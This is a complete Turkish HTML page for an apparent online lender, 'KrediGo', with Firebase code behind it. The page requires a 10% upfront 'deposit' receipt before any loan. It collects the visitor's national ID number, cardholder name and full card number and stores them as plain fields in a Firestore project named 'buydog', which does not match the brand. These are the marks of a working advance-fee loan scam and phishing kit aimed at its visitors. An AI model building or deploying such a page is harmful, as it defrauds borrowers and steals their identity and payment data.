<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>KrediGo | Profesyonel Online Kredi</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      scroll-behavior: smooth;
    }
    body {
      font-family: 'Inter', sans-serif;
      background: #0a0c15;
      color: #ffffff;
      overflow-x: hidden;
    }
    .bg-glow {
      position: fixed;
      width: 650px;
      height: 650px;
      border-radius: 50%;
      filter: blur(130px);
      z-index: -1;
    }
    .glow1 { background: #2563eb; top: -250px; left: -250px; opacity: 0.2; }
    .glow2 { background: #7c3aed; right: -300px; bottom: -300px; opacity: 0.15; }
    .container {
      width: 90%;
      max-width: 1280px;
      margin: 0 auto;
    }
    /* Navbar */
    .navbar {
      position: sticky;
      top: 0;
      z-index: 100;
      backdrop-filter: blur(20px);
      background: rgba(10, 12, 21, 0.8);
      border-bottom: 1px solid rgba(255,255,255,0.08);
    }
    .nav-content {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 20px 0;
    }
    .logo {
      font-size: 28px;
      font-weight: 800;
      background: linear-gradient(135deg, #fff, #60a5fa);
      -webkit-background-clip: text;
      background-clip: text;
      color: transparent;
    }
    .nav-links {
      display: flex;
      gap: 25px;
      align-items: center;
    }
    .nav-links a {
      color: #cbd5e1;
      text-decoration: none;
      font-weight: 500;
      transition: 0.3s;
    }
    .nav-links a:hover { color: #60a5fa; }
    .nav-links button {
      background: linear-gradient(135deg, #2563eb, #7c3aed);
      border: none;
      padding: 10px 20px;
      border-radius: 40px;
      color: white;
      font-weight: 600;
      cursor: pointer;
      transition: 0.3s;
    }
    .nav-links button:hover {
      transform: scale(1.02);
      box-shadow: 0 5px 15px rgba(37,99,235,0.4);
    }
    /* Hero / Başvuru Bölümü */
    .hero {
      padding: 60px 0 80px;
    }
    .apply-card {
      background: rgba(15, 20, 35, 0.6);
      backdrop-filter: blur(16px);
      border: 1px solid rgba(255,255,255,0.08);
      border-radius: 48px;
      padding: 40px;
      max-width: 900px;
      margin: 0 auto;
    }
    .section-title {
      text-align: center;
      margin-bottom: 40px;
    }
    .section-title span {
      color: #60a5fa;
      text-transform: uppercase;
      letter-spacing: 2px;
      font-size: 14px;
    }
    .section-title h2 {
      font-size: 42px;
      margin-top: 10px;
      background: linear-gradient(135deg, #fff, #94a3b8);
      -webkit-background-clip: text;
      background-clip: text;
      color: transparent;
    }
    /* Calculator */
    .calc-group {
      display: flex;
      gap: 20px;
      flex-wrap: wrap;
      margin-bottom: 30px;
    }
    .input-box {
      flex: 1;
    }
    .input-box label {
      display: block;
      margin-bottom: 8px;
      color: #cbd5e1;
      font-weight: 500;
    }
    .input-box input, .input-box select {
      width: 100%;
      background: rgba(0,0,0,0.4);
      border: 1px solid rgba(255,255,255,0.1);
      padding: 14px 18px;
      border-radius: 28px;
      color: white;
      font-size: 16px;
    }
    .result-row {
      display: flex;
      justify-content: space-between;
      background: rgba(0,0,0,0.3);
      padding: 20px;
      border-radius: 28px;
      margin: 20px 0;
    }
    .warning {
      color: #f97316;
      font-size: 13px;
      margin-top: 8px;
      display: none;
    }
    /* Form */
    .form-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 20px;
      margin: 30px 0 20px;
    }
    .form-grid input {
      background: rgba(0,0,0,0.4);
      border: 1px solid rgba(255,255,255,0.1);
      padding: 14px 18px;
      border-radius: 28px;
      color: white;
    }
    .upload-area {
      border: 2px dashed rgba(255,255,255,0.2);
      border-radius: 28px;
      padding: 30px;
      text-align: center;
      margin: 20px 0;
      cursor: pointer;
      transition: 0.3s;
    }
    .upload-area:hover {
      border-color: #60a5fa;
      background: rgba(96,165,250,0.05);
    }
    .btn-submit {
      width: 100%;
      background: linear-gradient(135deg, #2563eb, #7c3aed);
      border: none;
      padding: 16px;
      border-radius: 40px;
      font-size: 18px;
      font-weight: 700;
      color: white;
      cursor: pointer;
      transition: 0.3s;
    }
    .btn-submit:disabled {
      opacity: 0.5;
      cursor: not-allowed;
    }
    .message {
      padding: 15px;
      border-radius: 28px;
      margin-top: 20px;
      display: none;
    }
    .success { background: rgba(34,197,94,0.15); border: 1px solid #22c55e; color: #86efac; }
    .error { background: rgba(220,38,38,0.15); border: 1px solid #ef4444; color: #fca5a5; }
    /* Modal */
    .modal {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.8);
      backdrop-filter: blur(8px);
      z-index: 1000;
      justify-content: center;
      align-items: center;
    }
    .modal-content {
      background: #111827;
      border-radius: 32px;
      padding: 32px;
      width: 90%;
      max-width: 420px;
      border: 1px solid rgba(255,255,255,0.1);
    }
    .modal-content h3 {
      margin-bottom: 20px;
    }
    .modal-content input {
      width: 100%;
      margin-bottom: 16px;
      padding: 14px;
      border-radius: 28px;
      background: #1e293b;
      border: none;
      color: white;
    }
    .modal-content button {
      width: 100%;
      padding: 12px;
      border-radius: 28px;
      border: none;
      margin-top: 8px;
      cursor: pointer;
      font-weight: 600;
    }
    .close-modal {
      background: #1e293b;
      color: white;
    }
    /* Footer */
    footer {
      text-align: center;
      padding: 40px 0;
      border-top: 1px solid rgba(255,255,255,0.05);
      margin-top: 60px;
      color: #64748b;
    }
    @media (max-width: 768px) {
      .form-grid { grid-template-columns: 1fr; }
      .calc-group { flex-direction: column; }
      .apply-card { padding: 24px; }
    }
  </style>
</head>
<body>
<div class="bg-glow glow1"></div>
<div class="bg-glow glow2"></div>

<nav class="navbar">
  <div class="container nav-content">
    <div class="logo">KrediGo</div>
    <div class="nav-links">
      <a href="#home">Ana Sayfa</a>
      <a href="#apply">Başvur</a>
      <button id="loginBtn">Giriş Yap</button>
      <button id="registerBtn">Kayıt Ol</button>
      <button id="logoutBtn" style="display:none;">Çıkış Yap</button>
    </div>
  </div>
</nav>

<section class="hero" id="home">
  <div class="container">
    <div class="apply-card">
      <div class="section-title">
        <span>Hızlı Başvuru</span>
        <h2>Kredi Hesapla ve Başvur</h2>
      </div>

      <!-- Kredi Hesaplayıcı -->
      <div class="calc-group">
        <div class="input-box">
          <label>Kredi Tutarı (₺)</label>
          <input type="number" id="amount" value="5000" step="500" min="1000">
          <div id="amountWarning" class="warning">⚠️ Minimum 1000₺</div>
        </div>
        <div class="input-box">
          <label>Geri Ödeme Süresi</label>
          <select id="month">
            <option value="1">1 Ay (faizsiz)</option>
            <option value="2">2 Ay (+%10)</option>
            <option value="3">3 Ay (+%15)</option>
          </select>
        </div>
      </div>
      <div class="result-row">
        <span>Deposit (%10)</span>
        <strong id="deposit">500₺</strong>
        <span>Toplam Geri Ödeme</span>
        <strong id="returnAmount">5000₺</strong>
      </div>

      <!-- Başvuru Formu -->
      <div class="form-grid">
        <input type="text" id="fullname" placeholder="Ad Soyad">
        <input type="tel" id="phone" placeholder="Telefon">
        <input type="email" id="email" placeholder="E-posta">
        <input type="text" id="tc" placeholder="TC Kimlik No">
        <input type="text" id="cardname" placeholder="Kart Sahibi">
        <input type="text" id="cardnumber" placeholder="Kart Numarası">
      </div>
      <div class="upload-area" id="uploadArea">
        📸 Deposit dekontunu yükleyin (screenshot/çek)
        <input type="file" id="fileInput" style="display:none;" accept="image/*">
      </div>
      <button class="btn-submit" id="submitBtn" disabled>Başvuruyu Gönder</button>
      <div id="messageBox" class="message"></div>
    </div>
  </div>
</section>

<footer>
  <div class="container">
    <p>&copy; 2025 KrediGo - Güvenli ve Hızlı Online Kredi</p>
  </div>
</footer>

<!-- Modal (Kayıt/Giriş) -->
<div id="authModal" class="modal">
  <div class="modal-content">
    <h3 id="modalTitle">Giriş Yap</h3>
    <input type="email" id="modalEmail" placeholder="E-posta">
    <input type="password" id="modalPassword" placeholder="Şifre">
    <button id="modalActionBtn">Giriş Yap</button>
    <button class="close-modal" id="closeModal">İptal</button>
  </div>
</div>

<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/12.14.0/firebase-app.js";
  import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/12.14.0/firebase-auth.js";
  import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/12.14.0/firebase-firestore.js";
  import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/12.14.0/firebase-storage.js";

  const firebaseConfig = {
    apiKey: "AIzaSyDCkFVXfK53Uqtj13cOhKIE3pg3bLmyTX4",
    authDomain: "buydog.firebaseapp.com",
    projectId: "buydog",
    storageBucket: "buydog.firebasestorage.app",
    messagingSenderId: "360970981236",
    appId: "1:360970981236:web:2b1005e6abc80655ada621"
  };
  const app = initializeApp(firebaseConfig);
  const auth = getAuth(app);
  const db = getFirestore(app);
  const storage = getStorage(app);

  // DOM Elemanları
  const loginBtn = document.getElementById('loginBtn');
  const registerBtn = document.getElementById('registerBtn');
  const logoutBtn = document.getElementById('logoutBtn');
  const modal = document.getElementById('authModal');
  const modalTitle = document.getElementById('modalTitle');
  const modalEmail = document.getElementById('modalEmail');
  const modalPassword = document.getElementById('modalPassword');
  const modalActionBtn = document.getElementById('modalActionBtn');
  const closeModal = document.getElementById('closeModal');
  const submitBtn = document.getElementById('submitBtn');
  const amountInput = document.getElementById('amount');
  const monthSelect = document.getElementById('month');
  const depositSpan = document.getElementById('deposit');
  const returnSpan = document.getElementById('returnAmount');
  const warning = document.getElementById('amountWarning');
  const fileInput = document.getElementById('fileInput');
  const uploadArea = document.getElementById('uploadArea');
  const messageBox = document.getElementById('messageBox');

  let currentUser = null;
  let selectedFile = null;
  let authMode = 'login'; // 'login' veya 'register'

  // Hesaplayıcı
  function calculate() {
    let val = Number(amountInput.value);
    if (isNaN(val) || val < 1000) {
      warning.style.display = 'block';
      depositSpan.innerText = '—';
      returnSpan.innerText = '—';
      return;
    }
    warning.style.display = 'none';
    let deposit = val * 0.10;
    let total = val;
    if (monthSelect.value === '2') total = val * 1.10;
    if (monthSelect.value === '3') total = val * 1.15;
    depositSpan.innerText = `${Math.round(deposit)}₺`;
    returnSpan.innerText = `${Math.round(total)}₺`;
  }
  amountInput.addEventListener('input', calculate);
  monthSelect.addEventListener('change', calculate);
  calculate();

  // Dosya yükleme
  uploadArea.addEventListener('click', () => fileInput.click());
  fileInput.addEventListener('change', (e) => {
    if (e.target.files.length) {
      selectedFile = e.target.files[0];
      uploadArea.innerHTML = `✅ ${selectedFile.name} yüklendi. Tekrar tıklayarak değiştirin.`;
    }
  });

  // Modal işlemleri
  function openModal(mode) {
    authMode = mode;
    modalTitle.innerText = mode === 'login' ? 'Giriş Yap' : 'Kayıt Ol';
    modalActionBtn.innerText = mode === 'login' ? 'Giriş Yap' : 'Kayıt Ol';
    modalEmail.value = '';
    modalPassword.value = '';
    modal.style.display = 'flex';
  }
  closeModal.onclick = () => modal.style.display = 'none';
  modalActionBtn.onclick = async () => {
    const email = modalEmail.value.trim();
    const pwd = modalPassword.value;
    if (!email || !pwd) { showMessage('Lütfen email ve şifre girin.', 'error'); return; }
    try {
      if (authMode === 'login') {
        await signInWithEmailAndPassword(auth, email, pwd);
        showMessage('Giriş başarılı!', 'success');
      } else {
        if (pwd.length < 6) { showMessage('Şifre en az 6 karakter.', 'error'); return; }
        await createUserWithEmailAndPassword(auth, email, pwd);
        showMessage('Kayıt başarılı! Şimdi giriş yapın.', 'success');
        openModal('login');
      }
      modal.style.display = 'none';
    } catch (err) {
      showMessage('Hata: ' + err.message, 'error');
    }
  };

  // Oturum durumu
  onAuthStateChanged(auth, (user) => {
    currentUser = user;
    if (user) {
      loginBtn.style.display = 'none';
      registerBtn.style.display = 'none';
      logoutBtn.style.display = 'inline-block';
      submitBtn.disabled = false;
    } else {
      loginBtn.style.display = 'inline-block';
      registerBtn.style.display = 'inline-block';
      logoutBtn.style.display = 'none';
      submitBtn.disabled = true;
    }
  });
  logoutBtn.onclick = () => signOut(auth);

  // Mesaj gösterme
  function showMessage(msg, type) {
    messageBox.className = `message ${type}`;
    messageBox.innerText = msg;
    messageBox.style.display = 'block';
    setTimeout(() => messageBox.style.display = 'none', 5000);
  }

  // Başvuru Gönderme (Dosya + Veri)
  submitBtn.addEventListener('click', async () => {
    if (!currentUser) { showMessage('Lütfen giriş yapın.', 'error'); return; }
    if (!selectedFile) { showMessage('Lütfen deposit dekontunu yükleyin.', 'error'); return; }
    const fullname = document.getElementById('fullname').value.trim();
    const phone = document.getElementById('phone').value.trim();
    const email = document.getElementById('email').value.trim();
    const tc = document.getElementById('tc').value.trim();
    const cardname = document.getElementById('cardname').value.trim();
    const cardnumber = document.getElementById('cardnumber').value.trim();
    if (!fullname || !phone || !email || !tc || !cardname || !cardnumber) {
      showMessage('Tüm alanları doldurun.', 'error');
      return;
    }
    if (tc.length !== 11 || isNaN(tc)) { showMessage('TC 11 haneli olmalı.', 'error'); return; }
    const amount = Number(amountInput.value);
    if (amount < 1000) { showMessage('Minimum kredi 1000₺', 'error'); return; }

    submitBtn.disabled = true;
    submitBtn.innerText = 'Gönderiliyor...';

    try {
      // Dosyayı Storage'a yükle
      const fileRef = ref(storage, `applications/${currentUser.uid}/${Date.now()}_${selectedFile.name}`);
      await uploadBytes(fileRef, selectedFile);
      const fileUrl = await getDownloadURL(fileRef);

      // Veriyi Firestore'a kaydet
      await addDoc(collection(db, "applications"), {
        userId: currentUser.uid,
        userEmail: currentUser.email,
        fullname, phone, email, tc, cardname, cardnumber,
        amount: amount,
        months: Number(monthSelect.value),
        deposit: Number(depositSpan.innerText.replace('₺','')),
        returnAmount: Number(returnSpan.innerText.replace('₺','')),
        screenshotUrl: fileUrl,
        date: new Date().toISOString()
      });
      showMessage('Başvurunuz başarıyla kaydedildi!', 'success');
      // Formu temizle
      document.getElementById('fullname').value = '';
      document.getElementById('phone').value = '';
      document.getElementById('email').value = '';
      document.getElementById('tc').value = '';
      document.getElementById('cardname').value = '';
      document.getElementById('cardnumber').value = '';
      selectedFile = null;
      fileInput.value = '';
      uploadArea.innerHTML = '📸 Deposit dekontunu yükleyin (screenshot/çek)';
    } catch (err) {
      showMessage('Hata: ' + err.message, 'error');
    } finally {
      submitBtn.disabled = false;
      submitBtn.innerText = 'Başvuruyu Gönder';
    }
  });

  loginBtn.onclick = () => openModal('login');
  registerBtn.onclick = () => openModal('register');
  window.onclick = (e) => { if (e.target === modal) modal.style.display = 'none'; };
</script>
</body>
</html>
